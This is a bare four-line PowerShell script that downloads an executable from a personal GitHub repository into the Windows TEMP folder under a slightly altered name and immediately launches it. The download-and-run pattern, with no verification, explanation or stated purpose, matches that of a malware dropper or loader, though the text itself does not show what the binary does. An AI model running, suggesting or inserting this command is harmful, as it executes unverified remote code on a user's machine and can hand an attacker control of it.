$url = "https://github.com/x444z/dxgl/raw/refs/heads/main/dhxgl.exe"
$out = "$env:TEMP\dhgxl.exe"
Invoke-WebRequest -Uri $url -OutFile $out

Start-Process $out
